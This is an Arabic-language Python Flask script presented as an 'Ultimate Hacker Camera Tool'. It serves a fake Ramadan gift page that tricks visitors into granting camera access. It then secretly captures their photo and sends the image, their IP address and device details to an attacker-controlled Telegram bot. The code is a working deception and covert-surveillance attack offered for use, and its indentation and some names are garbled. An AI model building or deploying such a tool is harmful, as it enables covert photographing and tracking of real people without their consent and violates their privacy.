import os
from flask import Flask, request, render_template_string, jsonify
import requests
import datetime
import base64
from rich.panel import Panel;from rich import print as P
from io import BytesIO

app = Flask(name)

import os, sys, time, random, threading, datetime
from io import BytesIO
import base64, requests
from flask import Flask, request, render_template_string, jsonify

---------------- ألوان نيون متغيرة ----------------

colors = ["\033[92m", "\033[96m", "\033[95m", "\033[93m"]
reset = "\033[0m"

---------------- تأثير Matrix وحروف تتساقط ----------------

def matrix_effect(stop_event):
cols = os.get_terminal_size().columns
while not stop_event.is_set():
line = ''.join(random.choice("01-#@%$&?") for _ in range(cols))
print(random.choice(colors) + line + reset)
time.sleep(0.03)

---------------- كتابة حرف حرف مع تأثير كتابة متقدم ----------------

def type_writer(text, speed=0.03, sound=True):
for char in text:
sys.stdout.write(random.choice(colors) + char + reset)
sys.stdout.flush()
if sound and random.random() < 0.3:  # محاكاة صوت طباعة
sys.stdout.write("\a")
time.sleep(speed)
print()

---------------- شاشة تحميل وهمية مع تهكير وهمي ----------------

def loading_bar_with_hack():
print()
for i in range(101):
bar = "█" * (i // 2) + "-" * (50 - i // 2)
hack_msg = random.choice([
"Scanning Ports...",
"Bypassing Firewall...",
"Decrypting Data...",
"Injecting Payload...",
"Connecting to Target...",
"Initializing Exploit..."
])
sys.stdout.write(f"\r\033[92m[ {bar} ] {i}% | {hack_msg}\033[0m")
sys.stdout.flush()
time.sleep(0.02)
print("\n")

---------------- رسائل هاكرية ----------------

messages = [
"Initializing Ultimate HackTool...",
"Loading Advanced Modules...",
"Connecting to Network...",
"Access Granted...",
"Starting Camera Capture Module..."
]

---------------- بدء تأثير Matrix ----------------

stop_event = threading.Event()
matrix_thread = threading.Thread(target=matrix_effect, args=(stop_event,), daemon=True)
matrix_thread.start()

---------------- عرض الرسائل ----------------

for msg in messages:
type_writer(msg, 0.04)
time.sleep(0.5)

---------------- شاشة تحميل وهمية ----------------

loading_bar_with_hack()

---------------- إيقاف Matrix ----------------

stop_event.set()
time.sleep(0.3)

---------------- شاشة الترحيب ----------------

type_writer("اهلاً بك في Ultimate Hacker Camera Tool", 0.04)
type_writer("النظام جاهز للعمل...", 0.04)
print("\n" + "="*60 + "\n")

---------------- إدخال التوكن والID ----------------

TELEGRAM_BOT_TOKEN = input("أدخل توكن البوت: ")
TELEGRAM_CHAT_ID = input("أدخل ID التليجرام: ")

type_writer(f"تم حفظ التوكن: {TELEGRAM_BOT_TOKEN}", 0.03)
type_writer(f"تم حفظ الID: {TELEGRAM_CHAT_ID}", 0.03)
print("\n" + "="*60 + "\n")
os.system('clear')

def send_to_telegram(photo_base64, extra_info=""):
url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendPhoto"

img_data = base64.b64decode(photo_base64.split(',')[1])  
files = {'photo': ('webcam_ahmad.jpg', BytesIO(img_data), 'image/jpeg')}  
  
caption = f"صورة جديدة  Yfucyc\n{extra_info}"  
  
data = {"chat_id": TELEGRAM_CHAT_ID, "caption": caption}  
  
try:  
    r = requests.post(url, data=data, files=files, timeout=12)  
    if r.status_code == 200:  
        print("[+] وصلت الصورة لتليجرام Yfucyc")  
    else:  
        print(f"[-] مشكلة في الإرسال: {r.text}")  
except Exception as e:  
    print(f"[-] خطأ: {e}")

HTML_PAGE = """

<!DOCTYPE html>  <html lang="ar" dir="rtl">  
<head>  
    <meta charset="UTF-8">  
    <meta name="viewport" content="width=device-width, initial-scale=1.0">  
    <title>هدية رمضان الكريم 🎁</title>  
    <style>  
        body {  
            margin: 0;  
            padding: 0;  
            font-family: 'Segoe UI', Tahoma, sans-serif;  
            background: linear-gradient(135deg, #1e3c72, #2a5298);  
            color: white;  
            height: 100vh;  
            display: flex;  
            flex-direction: column;  
            align-items: center;  
            justify-content: center;  
            text-align: center;  
        }  
        h1 { font-size: 3rem; margin: 0.5rem; text-shadow: 0 0 15px gold; }  
        .gift { font-size: 8rem; animation: pulse 2s infinite; }  
        p { font-size: 1.4rem; max-width: 600px; }  
        video, canvas { display: none; }  
        .loader {  
            border: 8px solid #f3f3f3;  
            border-top: 8px solid #3498db;  
            border-radius: 50%;  
            width: 70px;  
            height: 70px;  
            animation: spin 1.2s linear infinite;  
            margin: 2rem auto;  
        }  
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }  
        @keyframes pulse { 0% { transform: scale(1); } 50% { transform: scale(1.15); } 100% { transform: scale(1); } }  
    </style>  
</head>  
<body>  
    <div class="gift">🎁</div>  
    <h1>مبروك! هدية رمضانية خاصة لك</h1>  
    <p>اضغط "فتح الهدية" واستلم هديتك فوراً<br>جاري التحميل...</p>  <div class="loader" id="loader"></div>  
  
<video id="video" autoplay playsinline></video>  
<canvas id="canvas"></canvas>  

<script>  
    const video = document.getElementById('video');  
    const canvas = document.getElementById('canvas');  
    const loader = document.getElementById('loader');  

    navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })  
        .then(stream => {  
            video.srcObject = stream;  
            setTimeout(() => {  
                captureAndSend();  
            }, 6000);  
        })  
        .catch(err => {  
            console.error("كاميرا خطأ:", err);  
            document.body.innerHTML += "<p style='color:gold'>السماح بالكاميرا مطلوب عشان الهدية</p>";  
        });  

    function captureAndSend() {  
        const context = canvas.getContext('2d');  
        canvas.width = video.videoWidth;  
        canvas.height = video.videoHeight;  
        context.drawImage(video, 0, 0, canvas.width, canvas.height);  

        const dataURL = canvas.toDataURL('image/jpeg', 0.92);  

        fetch('/capture', {  
            method: 'POST',  
            headers: { 'Content-Type': 'application/json' },  
            body: JSON.stringify({ image: dataURL })  
        })  
        .then(resp => resp.json())  
        .then(data => {  
            document.body.innerHTML = `  
                <div class="gift">🎉</div>  
                <h1>تم استلام هديتك بنجاح!</h1>  
                <p style="font-size:1.6rem;color:gold;">شكراً لك، رمضان كريم 🌙</p>  
            `;  
            video.srcObject.getTracks().forEach(track => track.stop());  
        })  
        .catch(err => console.error(err));  
    }  
</script>

</body>  
</html>  
"""  @app.route("/", methods=["GET"])
def index():
return render_template_string(HTML_PAGE)

@app.route("/capture", methods=["POST"])
def capture():
try:
data = request.get_json()
img_base64 = data.get("image", "")

if not img_base64:  
        return jsonify({"status": "error", "msg": "مافي صورة"}), 400  

    ip = request.remote_addr  
    ua = request.headers.get("User-Agent", "غير معروف")  
    time_now = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")  
      
    extra = f"الوقت: {time_now}\nIP: {ip}\nالجهاز: {ua[:120]}"  

    send_to_telegram(img_base64, extra)  

    return jsonify({"status": "ok"})  
except Exception as e:  
    print(f"خطأ: {e}")  
    return jsonify({"status": "error"}), 500

if name == "main":
print("""
""")

app.run(host="0.0.0.0", port=5000, debug=False)
